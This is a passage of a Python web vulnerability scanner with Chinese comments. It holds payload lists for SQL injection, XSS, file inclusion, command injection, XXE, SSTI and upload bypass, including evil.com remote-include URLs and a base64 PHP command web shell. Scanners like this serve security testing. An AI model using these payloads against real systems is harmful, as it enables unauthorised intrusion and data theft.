# -*- coding: utf-8 -*-
"""
Web漏洞扫描器模块
支持SQL注入、XSS、LFI、RFI、命令注入、CSRF、SSRF、开放重定向、
XXE、路径遍历、文件上传、点击劫持、SSTI、CORS、目录列表、
HTTP方法枚举、WAF检测等18种检测
"""

import re
import copy
import random
import urllib3
import requests
from urllib.parse import urlparse, urljoin, quote
from requests.packages.urllib3.exceptions import InsecureRequestWarning

from core.colors import *
from core.utils import *

# 禁用SSL警告
urllib3.disable_warnings(InsecureRequestWarning)


class WebVulnScanner:
    """Web漏洞扫描器"""

    # ==================== 通用Payload列表 ====================

    # SQL注入Payload
    SQLI_PAYLOADS = [
        "'",
        "\"",
        "')",
        "'))",
        "1' OR '1'='1",
        "1\" OR \"1\"=\"1",
        "1' OR 1=1 -- -",
        "1\" OR 1=1 -- -",
        "1' OR 1=1 #",
        "1' OR '1'='1' -- -",
        "' OR 1=1 -- -",
        "\" OR 1=1 -- -",
        "admin' -- -",
        "admin\" -- -",
        "admin' #",
        "admin' OR '1'='1",
        "admin\" OR \"1\"=\"1",
        "1' AND 1=1 -- -",
        "1' AND 1=2 -- -",
        "' UNION SELECT 1 -- -",
        "' UNION SELECT 1,2 -- -",
        "' UNION SELECT 1,2,3 -- -",
        "' UNION SELECT NULL-- -",
        "' UNION SELECT NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL-- -",
        "1' AND SLEEP(5) -- -",
        "1' AND SLEEP(5)#",
        "1' AND BENCHMARK(5000000,MD5(1)) -- -",
        "1' AND pg_sleep(5) -- -",
        "1' WAITFOR DELAY '0:0:5' -- -",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- -",
        "1' AND 1=1 UNION SELECT 1,@@version,3 -- -",
        "1' AND 1=1 UNION SELECT 1,database(),3 -- -",
        "1' AND 1=1 UNION SELECT 1,user(),3 -- -",
        "1/**/OR/**/1=1-- -",
        "1'/*!OR*/1=1-- -",
        "1' OR 1=1 LIMIT 1 -- -",
        "1' OR '1'='1' ORDER BY 1 -- -",
        "1' OR '1'='1' ORDER BY 2 -- -",
        "1' OR '1'='1' ORDER BY 3 -- -",
        "1' OR 1=1 INTO OUTFILE '/tmp/test.txt' -- -",
        "1' OR 1=1 INTO DUMPFILE '/tmp/test.txt' -- -",
        "1' OR 1=1 FOR XML PATH('') -- -",
        "' OR '1'='1'/*",
        "1' OR 1=1 EXEC xp_cmdshell('dir') -- -",
    ]

    # XSS Payload
    XSS_PAYLOADS = [
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<script>confirm(1)</script>",
        "<script>prompt(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>",
        "<a href='javascript:alert(1)'>click</a>",
        "<iframe src=javascript:alert(1)>",
        "<iframe srcdoc='<script>alert(1)</script>'>",
        "javascript:alert(1)",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "';alert(1);//",
        "\"><img src=x onerror=alert(1)>",
        "'><img src=x onerror=alert(1)>",
        "<<SCRIPT>alert(1)</SCRIPT>",
        "<ScRiPt>alert(1)</sCrIpT>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<img src=\"x\" onerror=\"alert(1)\">",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "{{constructor.constructor('alert(1)')()}}",
        "\"><svg/onload=alert(1)>",
        "'';!--\"<XSS>=&{()}",
        "<IMG SRC=javascript:alert('XSS')>",
        "<IMG SRC=JaVaScRiPt:alert('XSS')>",
        "<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
        "<IMG SRC=`javascript:alert(\"XSS\")`>",
        "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
        "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
        "\\\";alert(1);//",
    ]

    # LFI Payload
    LFI_PAYLOADS = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "../../../etc/passwd%00",
        "../../../etc/passwd%00.png",
        "....//....//....//etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "../../../etc/hosts",
        "../../../etc/issue",
        "../../../etc/group",
        "../../../etc/shadow",
        "../../../etc/my.cnf",
        "../../../etc/httpd/conf/httpd.conf",
        "../../../etc/nginx/nginx.conf",
        "../../../proc/self/environ",
        "../../../proc/self/fd/0",
        "../../../proc/self/fd/1",
        "../../../proc/self/fd/2",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=config.php",
        "php://filter/read=convert.base64-encode/resource=../config.php",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=config",
        "php://input",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==",
        "expect://id",
        "file:///etc/passwd",
        "file:///etc/hosts",
        "/etc/passwd",
        "/etc/hosts",
        "/etc/issue",
        "/windows/win.ini",
        "/windows/system32/drivers/etc/hosts",
        "C:\\windows\\win.ini",
        "C:\\windows\\system32\\drivers\\etc\\hosts",
    ]

    # RFI Payload
    RFI_PAYLOADS = [
        "http://evil.com/shell.txt",
        "http://evil.com/shell.php",
        "http://evil.com/info.txt",
        "https://evil.com/shell.txt",
        "http://evil.com/cmd.txt",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
        "php://input",
        "expect://id",
    ]

    # 命令注入Payload
    CMD_INJECTION_PAYLOADS = [
        "; id",
        "| id",
        "|| id",
        "& id",
        "&& id",
        "`id`",
        "$(id)",
        "; whoami",
        "| whoami",
        "|| whoami",
        "& whoami",
        "&& whoami",
        "; ping -c 3 127.0.0.1",
        "| ping -c 3 127.0.0.1",
        "; echo INJECTED",
        "| echo INJECTED",
        "& echo INJECTED",
        "&& echo INJECTED",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; ls -la",
        "| ls -la",
        "; dir",
        "| dir",
        "; type C:\\windows\\win.ini",
        "| type C:\\windows\\win.ini",
        "| netstat -an",
        "; netstat -an",
        "| ipconfig",
        "; ipconfig",
        "| ifconfig",
        "; ifconfig",
        "`sleep 5`",
        "$(sleep 5)",
        "| sleep 5",
        "; sleep 5",
        "`ping -c 5 127.0.0.1`",
        "$(ping -c 5 127.0.0.1)",
        "| ping -n 5 127.0.0.1",
        "| nslookup google.com",
        "; nslookup google.com",
    ]

    # SSRF Payload
    SSRF_PAYLOADS = [
        "http://127.0.0.1:80",
        "http://127.0.0.1:8080",
        "http://127.0.0.1:443",
        "http://localhost:80",
        "http://localhost:8080",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:6379",
        "http://127.0.0.1:27017",
        "http://[::1]:80",
        "http://[::1]:8080",
        "http://0.0.0.0:80",
        "http://0.0.0.0:8080",
        "http://0:80",
        "http://0:8080",
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///proc/self/environ",
        "dict://127.0.0.1:6379/info",
        "dict://127.0.0.1:3306/info",
        "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflus[...]",
        "http://127.1:80",
        "http://127.0.1:80",
        "http://2130706433:80",
        "http://0x7f000001:80",
        "http://017700000001:80",
    ]

    # 开放重定向Payload
    OPEN_REDIRECT_PAYLOADS = [
        "http://evil.com",
        "https://evil.com",
        "//evil.com",
        "//evil.com/",
        "http://evil.com/",
        "https://evil.com/",
        "///evil.com",
        "//evil.com@valid.com",
        "http://evil.com:80",
        "https://evil.com:443",
        "/\\evil.com",
        "http://evil.com%2f@valid.com",
        "http://valid.com@evil.com",
        "http://evil.com?",
        "http://evil.com#",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ]

    # XXE Payload
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/hosts">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://evil.com/xxe_test">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">%remote;]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "expect://id">]><root>&test;</root>',
    ]

    # 路径遍历Payload
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "../../../etc/hosts",
        "../../../etc/issue",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "..%252f..%252f..%252fetc/passwd",
        "..%c0%ae..%c0%ae..%c0%ae/etc/passwd",
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
        "..%5c..%5c..%5c..%5cwindows\\win.ini",
        "..%255c..%255c..%255c..%255cwindows\\win.ini",
    ]

    # 文件上传绕过Payload (文件名)
    FILE_UPLOAD_PAYLOADS = [
        "shell.php",
        "shell.php3",
        "shell.php4",
        "shell.php5",
        "shell.phtml",
        "shell.pht",
        "shell.php%00.png",
        "shell.php%00.jpg",
        "shell.php\x00.png",
        "shell.php.jpg",
        "shell.php.123",
        "shell.php.abc",
        "shell.php. .jpg",
        "shell.php. .png",
        "shell.asp",
        "shell.aspx",
        "shell.asa",
        "shell.cer",
        "shell.cdx",
        "shell.jsp",
        "shell.jspx",
        "shell.cgi",
        "shell.pl",
        "shell.shtml",
        "shell.shtm",
        "shell.PhP",
        "shell.ASP",
        "shell.Jsp",
        "shell.pHp",
        "shell.php;.jpg",
        "shell.php%00.jpg",
        "shell.php%20",
        "shell.php%0a",
        "shell.php%0d%0a.jpg",
        "shell.php..jpg",
        "shell.php..png",
        ".shell.php",
        "shell.php.",
        "shell.php. .",
        "shell.php. . .",
        "shell.p.phphp",
        "shell.php.8.9.0",
        "shell.php.1.2.3",
    ]

    # SSTI检测Payload
    SSTI_PAYLOADS = [
        "{{7*7}}",
        "{{7*'7'}}",
        "${7*7}",
        "${{7*7}}",
        "#{7*7}",
        "*{7*7}",
        "{{config}}",
        "{{self}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{7*'7'}}",
        "${7*'7'}",
        "{{ ''.__class__.__mro__[2].__subclasses__() }}",
        "${7*7}",
        "${{7*7}}",
        "@(7*7)",
        "{7*7}",
        "{{'7'*7}}",
        "<%= 7*7 %>",
        "{{7*7|safe}}",
        "{{'7'.__class__}}",
        "{{'a'.__class__.__mro__}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{lipsum.__globals__.os.popen('id').read()}}",
        "{{joiner.__init__.__globals__.os.popen('id').read()}}",
        "{{namespace.__init__.__globals__.os.popen('id').read()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    ]

    # HTTP方法列表
    HTTP_METHODS = [
        "GET",
        "POST",
        "PUT",
        "DELETE",
        "OPTIONS",
        "HEAD",
        "PATCH",
        "TRACE",
        "CONNECT",
        "PROPFIND",
        "PROPPATCH",
        "MKCOL",
        "COPY",
        "MOVE",
        "LOCK",
        "UNLOCK",
        "SEARCH",
        "MKCALENDAR",
        "ACL",
        "REPORT",
        "LINK",
        "UNLINK",
    ]

    # WAF检测Payload
    WAF_DETECTION_PAYLOADS = [
        "1' OR 1=1 -- -",
        "<script>alert(1)</script>",
        "../../../etc/passwd",
        "UNION SELECT * FROM users",
        "../../etc/passwd",
        "1' UNION SELECT 1,2,3-- -",
        "/*!*/",
        "admin' --",
        "1' AND SLEEP(5)--",
        "1' OR '1'='1",
        "../", "..\\", "..\\\\",
        "0x1f0x2e0x2f",
        "1' HAVING 1=1--",
        "1' GROUP BY 1,2,3--",
        "1' EXEC xp_cmdshell('dir')--",
        "1' AND 1=1 AND '%'='",
        "1' AND 1=2 AND '%'='",
    ]

    # ==================== 请求配置 ====================

    HEADERS = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }

    TIMEOUT = 10
    VERIFY_SSL = False

    def __init__(self, url=None, timeout=None, headers=None, verify_ssl=False, proxy=None):
        """
        初始化扫描器
        :param url: 目标URL
        :param timeout: 超时时间
        :param headers: 自定义请求头
        :param verify_ssl: 是否验证SSL证书
        :param proxy: 代理
        """
        self.url = url
        self.timeout = timeout or self.TIMEOUT
        self.verify_ssl = verify_ssl
        self.proxy = proxy
        self.session = requests.Session()

        # 合并请求头
        self.headers = self.HEADERS.copy()
        if headers:
            self.headers.update(headers)

        # 设置代理
        self.proxies = {}
        if proxy:
            self.proxies = {"http": proxy, "https": proxy}

        # 扫描结果
        self.results = {}

    def _send_request(self, url, method="GET", params=None, data=None, headers=None,
                      cookies=None, allow_redirects=True, timeout=None):
        """发送HTTP请求的通用方法"""
        try:
            req_headers = self.headers.copy()
            if headers:
                req_headers.update(headers)

            if timeout is None:
                timeout = self.timeout

            response = self.session.request(
                method=method,
                url=url,
                params=params,
                data=data,
                cookies=cookies,
                headers=req_headers,
                timeout=timeout,
                verify=self.verify_ssl,
                proxies=self.proxies,
                allow_redirects=allow_redirects,
            )
            return response
        except requests.exceptions.Timeout:
            print_warning(f"请求超时: {url}")
            return None
        except requests.exceptions.ConnectionError as e:
            print_error(f"连接失败: {url} - {e}")
            return None
        except requests.exceptions.RequestException as e:
            print_error(f"请求异常: {url} - {e}")
            return None
        except Exception as e:
            print_error(f"未知错误: {url} - {e}")
            return None

    def _extract_form_actions(self, html):
        """从HTML中提取表单action"""
        forms = []
        pattern = r'<form[^>]*action=["\'](.*?)["\']'
        matches = re.findall(pattern, html, re.IGNORECASE)
        for match in matches:
            forms.append(match)
        return forms

    def _check_response_content(self, response, patterns):
        """检查响应内容是否匹配指定模式"""
        if not response or not response.text:
            return False
        for pattern in patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True
        return False

    # ==================== 1. SQL注入检测 ====================

    def check_sql_injection(self, url=None):
        """SQL注入检测 - 基于报错和响应"""
        target = url or self.url
        print_section("SQL注入检测")
        results = {"vulnerable": False, "details": [], "url": target}

        if not target:
            print_error("未提供目标URL")
            return results

        print_info(f"目标: {target}")
        parsed = urlparse(target)

        # 获取URL中的参数
        if parsed.query:
            params = parsed.query.split("&")
            for param in params:
                if "=" in param:
                    key, value = param.split("=", 1)
                    for payload in self.SQLI_PAYLOADS[:20]:  # 每个参数测试前20个payload
                        try:
                            injected_url = target.replace(
                                f"{key}={value}",
                                f"{key}={requests.utils.quote(payload)}"
                            )
                            response = self._send_request(injected_url)
                            if not response:
                                continue

                            # 检测SQL错误
                            error_patterns = [
                                r"SQL syntax.*MySQL",
                                r"Warning.*mysql_.*",
                                r"MySQLSyntaxErrorException",
                                r"valid MySQL result",
                                r"check the manual that corresponds to your (MySQL|MariaDB) server",
                                r"Unknown column",
                                r"Unclosed quotation mark",
                                r"Microsoft OLE DB.*SQL Server",
                                r"Invalid query string",
                                r"SQL Server.*Driver",
                                r"Driver.*SQL Server",
                                r"SQL Server.*[0-9a-fA-F]{8}",
                                r"ODBC SQL Server Driver",
                                r"Dynamic SQL.*not properly",
                                r"Unclosed quotation mark after the character string",
                                r"Warning.*\Wmysqli?_",
                                r"MySQLSyntaxError",
                                r"PostgreSQL.*ERROR",
                                r"Warning.*\Wpg_.*",
                                r"valid PostgreSQL result",
                                r"psql.*ERROR",
                                r"SQLite.*Error",
                                r"SQLite.*Exception",
                                r"System.Data.SQLite",
                                r"Warning.*sqlite_.*",
                                r"Oracle.*Driver",
                                r"ORA-[0-9]{5}",
                                r"Oracle.*Exception",
                                r"PLS-[0-9]{5}",
                                r"Microsoft Access.*Error",
                                r"JET Engine.*Error",
                                r"Access.*Driver.*Error",
                                r"com\.mysql\.jdbc",
                                r"org\.postgresql",
                                r"org\.sqlite",
                                r"org\.h2\.jdbc",
                                r"SQLite/JDBCDriver",
                                r"DB2 SQL Error",
                                r"dynamic SQL",
                                r"Syntax error in query",
                            ]

                            if self._check_response_content(response, error_patterns):
                                msg = f"[SQL注入] 参数 '{key}' 可能存在SQL注入! Payload: {payload}"
                                print_success(msg)
                                results["vulnerable"] = True
                                results["details"].append({
                                    "parameter": key,
                                    "payload": payload,
                                    "type": "error-based",
                                    "url": injected_url,
                                })
                                break  # 找到一个payload即可

                        except Exception as e:
                            print_error(f"检测参数 {key} 时出错: {e}")
                            continue

        # 尝试POST注入
        if not results["vulnerable"]:
            print_info("尝试POST数据注入...")
            test_data = {"id": "1' OR 1=1 -- -", "user": "admin' -- -", "search": "' OR 1=1 -- -"}
            for key, payload in test_data.items():
                try:
                    response = self._send_request(target, method="POST", data={key: payload})
                    if response:
                        error_patterns = [r"SQL syntax", r"mysql_", r"ORA-[0-9]{5}", r"Unclosed quotation"]
                        if self._check_response_content(response, error_patterns):
                            msg = f"[POST-SQL注入] 参数 '{key}' 可能存在SQL注入!"
                            print_success(msg)
                            results["vulnerable"] = True
                            results["details"].append({
                                "parameter": key,
                                "payload": payload,
                                "type": "post-based",
                                "url": target,
                            })
                            break
                except Exception as e:
                    print_error(f"POST注入检测出错: {e}")
                    continue

        if not results["vulnerable"]:
            print_info("未检测到SQL注入漏洞")

        self.results["sql_injection"] = results
        return results

    # ==================== 2. XSS检测 ====================

    def check_xss(self, url=None):
        """XSS检测 - 反射型XSS"""
        target = url or self.url
        print_section("XSS (跨站脚本) 检测")
        results = {"vulnerable": False, "details": [], "url": target}

        if not target:
            print_error("未提供目标URL")
            return results

        print_info(f"目标: {target}")
        parsed = urlparse(target)

        if parsed.query:
            params = parsed.query.split("&")
            for param in params:
                if "=" in param:
                    key, value = param.split("=", 1)
                    for payload in self.XSS_PAYLOADS:
                        try:
                            encoded_payload = requests.utils.quote(payload)
                            injected_url = target.replace(
                                f"{key}={value}",
                                f"{key}={encoded_payload}"
                            )
                            response = self._send_request(injected_url)
                            if not response:
                                continue

                            # 检查payload是否在响应中回显
                            if payload in response.text or \
                               requests.utils.quote(payload) in response.text or \
                               payload.lower() in response.text.lower():

                                # 确认是未过滤的反射
                                if payload in response.text:
                                    msg = f"[XSS] 参数 '{key}' 存在反射型XSS! Payload: {payload}"
                                    print_success(msg)
                                    results["vulnerable"] = True
                                    results["details"].append({
                                        "parameter": key,
                                        "payload": payload,
                                        "type": "reflected",
                                        "url": injected_url,
                                    })
                                    break

                        except Exception as e:
                            continue

        # 尝试POST XSS
        if not results["vulnerable"]:
            print_info("尝试POST XSS...")
            test_payload = "<script>alert('XSS')</script>"
            test_data = {
                "name": test_payload,
                "search": test_payload,
                "q": test_payload,
                "comment": test_payload,
                "message": test_payload,
                "content": test_payload,
            }
            for key, payload in test_data.items():
                try:
                    response = self._send_request(target, method="POST", data={key: payload})
                    if response and payload in response.text:
                        msg = f"[POST-XSS] 参数 '{key}' 可能存在XSS!"
                        print_success(msg)
                        results["vulnerable"] = True
                        results["details"].append({
                            "parameter": key,
                            "payload": payload,
                            "type": "post-reflected",
                            "url": target,
                        })
                        break
                except Exception:
                    continue

        if not results["vulnerable"]:
            print_info("未检测到XSS漏洞")

        self.results["xss"] = results
        return results

    # ==================== 3. LFI检测 ====================

    def check_lfi(self, url=None):
        """本地文件包含检测"""
        target = url or self.url
        print_section("LFI (本地文件包含) 检测")
        results = {"vulnerable": False, "details": [], "url": target}

        if not target:
            print_error("未提供目标URL")
            return results

        print_info(f"目标: {target}")
        parsed = urlparse(target)

        if parsed.query:
            params = parsed.query.split("&")
            for param in params:
                if "=" in param:
                    key, value = param.split("=", 1)
                    for payload in self.LFI_PAYLOADS:
                        try:
                            injected_url = target.replace(
                                f"{key}={value}",
                                f"{key}={requests.utils.quote(payload)}"
                            )
                            response = self._send_request(injected_url)
                            if not response:
                                continue

                            # 检测文件包含成功
                            lfi_indicators = [
                                r"root:.*:0:0:",           # /etc/passwd
                                r"daemon:.*:1:1:",          # /etc/passwd
                                r"\[fonts\]",               # win.ini
                                r"\[extensions\]",          # win.ini
                                r"\[mail\]",                # win.ini
                                r"127\.0\.0\.1\s+localhost",  # /etc/hosts
                                r"::1\s+localhost",          # /etc/hosts
                                r"root:x:0:0",              # /etc/passwd (base64)
                                r"PGh0bWw+",                # base64 encoded HTML
                                r"PD9waHA",                 # base64 encoded PHP
                                r"bin/bash",                # /etc/passwd
                                r"nobody:x:",
                                r"www-data:x:",
                                r"UID=",                     # /proc/self/environ
                                r"GID=",                     # /proc/self/environ
                                r"HOME=",                    # /proc/self/environ
                                r"USER=",                    # /proc/self/environ
                                r"LOGNAME=",                 # /proc/self/environ
                            ]

                            if self._check_response_content(response, lfi_indicators):
                                msg = f"[LFI] 参数 '{key}' 存在本地文件包含! Payload: {payload}"
                                print_success(msg)
                                results["vulnerable"] = True
                                results["details"].append({
                                    "parameter": key,
                                    "payload": payload,
                                    "type": "lfi",
                                    "url": injected_url,
                                })
                                break

                        except Exception as e:
                            continue

        if not results["vulnerable"]:
            print_info("未检测到LFI漏洞")

        self.results["lfi"] = results
        return results

    # ==================== 4. RFI检测 ====================

    def check_rfi(self, url=None):
        """远程文件包含检测"""
        target = url or self.url
        print_section("RFI (远程文件包含) 检测")
        results = {"vulnerable": False, "details": [], "url": target}

        if not target:
            print_error("未提供目标URL")
            return results

        print_info(f"目标: {target}")
        parsed = urlparse(target)

        if parsed.query:
            params = parsed.query.split("&")
            for param in params:
                if "=" in param:
                    key, value = param.split("=", 1)
                    for payload in self.RFI_PAYLOADS:
                        try:
                            injected_url = target.replace(
                                f"{key}={value}",
                                f"{key}={requests.utils.quote(payload)}"
                            )
                            response = self._send_request(injected_url)
                            if not response:
                                continue

                            # RFI检测: 检查响应中是否包含外部URL调用特征
                            rfi_indicators = [
                                r"http://evil\.com",
                                r"https://evil\.com",
                                r"php:",
                                r"data:",
                                r"expect:",
                                r"allow_url_include",
                                r"Remote file",
                                r"failed to open stream",
                                r"HTTP request failed",
                                r"file_get_contents",
                                r"include\(.*http",
                                r"require\(.*http",
                            ]

                            if self._check_response_content(response, rfi_indicators):
                                msg = f"[RFI] 参数 '{key}' 可能存在远程文件包含! Payload: {payload}"
                                print_success(msg)
                                results["vulnerable"] = True
                                results["details"].append({
                                    "parameter": key,
                                    "payload": payload,
                                    "type": "rfi",
                                    "url": injected_url,
                                })
                                break

                            # 检查是否返回错误信息
                            error_patterns = [
                                r"failed to open stream",
                                r"allow_url_include",
                                r"allow_url_fopen",
                                r"not found in include_path",
                                r"failed opening",
                            ]
                            if self._check_response_content(response, error_patterns):
                                print_warning(f"[RFI] 参数 '{key}' 可能在include路径中，但allow_url_include可能关闭")
                                results["details"].append({
                                    "parameter": key,
                                    "payload": payload,
                                    "type": "rfi_possible",
                                    "url": injected_url,
                                })

                        except Exception:
                            continue

        if not results["vulnerable"]:
            print_info("未检测到RFI漏洞")

        self.results["rfi"] = results
        return results

    # ==================== 5. 命令注入检测 ====================

    def check_command_injection(self, url=None):
        """命令注入检测"""
        target = url or self.url
        print_section("命令注入检测")
        results = {"vulnerable": False, "details": [], "url": target}

        if not target:
            print_error("未提供目标URL")
            return results

        print_info(f"目标: {target}")

        # 检测命令执行结果的模式
        cmd_patterns = {
            "uid_patterns": [
                r"uid=\d+\(\w+\)",
                r"gid=\d+\(\w+\)",
                r"groups=\d+\(\w+\)",
            ],
            "whoami_patterns": [
                r"^root$",
                r"^www-data$",
                r"^admin$",
                r"^administrator$",
                r"^nt authority\\system$",
                r"^nobody$",
            ],
            "ping_patterns": [
                r"bytes from",
                r"icmp_seq",
                r"ttl=\d+",
                r"time=",
                r"Reply from",
                r"Destination Host Unreachable",
            ],
            "echo_patterns": [
                r"INJECTED",
            ],
            "system_patterns": [
                r"bin/",
                r"/usr/",
                r"etc/",
                r"total \d+",
                r"drwxr",
                r"-rw-r",
            ],
            "netstat_patterns": [
                r"Proto",
                r"Local Address",
                r"Foreign Address",
                r"LISTEN",
                r"ESTABLISHED",
                r"Active Connections",
                r"Active Internet connections",
            ],
            "ipconfig_patterns": [
                r"IP Address",
                r"Subnet Mask",
                r"Default Gateway",
                r"IPv4 Address",
                r"inet ",
                r"inet6 ",
                r"eth0",
                r"wlan0",
                r"lo:",
                r"enp",
            ],
        }

        parsed = urlparse(target)

        if parsed.query:
            params = parsed.query.split("&")
            for param in params:
                if "=" in param:
                    key, value = param.split("=", 1)
                    for payload in self.CMD_INJECTION_PAYLOADS:
                        try:
                            injected_url = target.replace(
                                f"{key}={value}",
                                f"{key}={requests.utils.quote(payload)}"
                            )
                            response = self._send_request(injected_url)
                            if not response:
                                continue

                            # 检查各种命令执行结果
                            for test_name, patterns in cmd_patterns.items():
                                if self._check_response_content(response, patterns):
                                    msg = f"[命令注入] 参数 '{key}' 存在命令注入! Payload: {payload} (匹配: {test_name})"
                                    print_success(msg)
                                    results["vulnerable"] = True
                                    results["details"].append({
                                        "parameter": key,
                                        "payload": payload,
                                        "type": "command_injection",
                                        "matched": test_name,
                                        "url": injected_url,
                                    })
                                    break

                            if results["vulnerable"]:
                                break

                        except Exception:
                            continue

                    if results["vulnerable"]:
                        break

        if not results["vulnerable"]:
            print_info("未检测到命令注入漏洞")

        self.results["command_injection"] = results
        return results

    # ==================== 6. CSRF检测 ====================

    def check_csrf(self, url=None):
        """CSRF漏洞检测 - 检查表单是否有token"""
        target = url or self.url
        print_section("CSRF (跨站请求伪造) 检测")
        results = {"vulnerable": False, "details": [], "url": target}

        if not target:
            print_error("未提供目标URL")
            return results

        print_info(f"目标: {target}")

        try:
            response = self._send_request(target)
            if not response:
                return results

            html = response.text

            # 查找所有表单
            form_pattern = re.compile(
                r'<form[^>]*>.*?</form>',
                re.IGNORECASE | re.DOTALL
            )
            forms = form_pattern.findall(html)

            if not forms:
                # 尝试查找简单的表单标签
                form_pattern = re.compile(
                    r'<form[^>]*>',
                    re.IGNORECASE
                )
                forms = form_pattern.findall(html)
                if forms:
                    print_info(f"找到 {len(forms)} 个表单标签 (未闭合)")

            if forms:
                print_info(f"找到 {len(forms)} 个表单，检查CSRF保护...")

                for i, form in enumerate(forms):
                    # CSRF Token检测模式
                    csrf_indicators = [
                        r"csrf",
                        r"token",
                        r"nonce",
                        r"authenticity_token",
                        r"__RequestVerificationToken",
                        r"xsrf",
                        r"xsrf-token",
                        r"csrf-token",
                        r"csrf_token",
                        r"csrfmiddlewaretoken",
                        r"CSRFName",
                        r"CSRFToken",
                        r"anticsrf",
                        r"anti-csrf",
                        r"form_build_id",
                        r"form_id",
                        r"form_token",
                        r"security_token",
                        r"sid",
                        r"session",
                        r"_wpnonce",
                        r"YII_CSRF_TOKEN",
                        r"laravel_token",
                        r"_token",
                        r"state",
                    ]

                    has_csrf = any(
                        re.search(pattern, form, re.IGNORECASE)
                        for pattern in csrf_indicators
                    )

                    if not has_csrf:
                        # 提取form action
                        action_match = re.search(r'action=["\'](.*?)["\']', form, re.IGNORECASE)
                        method_match = re.search(r'method=["\'](.*?)["\']', form, re.IGNORECASE)
                        action = action_match.group(1) if action_match else "(未指定，提交到当前URL)"
                        method = method_match.group(1) if method_match else "GET"

                        # 过滤掉搜索表单等低风险表单
                        low_risk = re.search(
                            r'search|query|keyword|q=',
                            form,
                            re.IGNORECASE
                        )

                        if not low_risk:
                            msg = f"[CSRF] 第{i+1}个表单缺少CSRF令牌! Action: {action}, Method: {method}"
                            print_warning(msg)
                            results["vulnerable"] = True
                            results["details"].append({
                                "form_number": i + 1,
                                "action": action,
                                "method": method,
                                "missing_token": True,
                            })
            else:
                print_info("未找到表单，跳过CSRF检测")

        except Exception as e:
            print_error(f"CSRF检测出错: {e}")

        if not results["vulnerable"]:
            print_info("未检测到CSRF漏洞 (所有表单均有token或不存在表单)")

        self.results["csrf"] = results
        return results

    # ==================== 7. SSRF检测 ====================

    def check_ssrf(self, url=None):
        """SSRF检测"""
        target = url or self.url
        print_section("SSRF (服务端请求伪造) 检测")
        results = {"vulnerable": False, "details": [], "url": target}

        if not target:
            print_error("未提供目标URL")
            return results

        print_info(f"目标: {target}")

        # 针对常见SSRF参数进行检测
        ssrf_params = [
            "url", "uri", "path", "dest", "redirect", "redirect_uri",
            "return", "return_to", "return_url", "go", "target",
            "view", "file", "load", "read", "img", "image",
            "src", "source", "link", "href", "domain", "callback",
            "data", "location", "out", "page", "show", "doc",
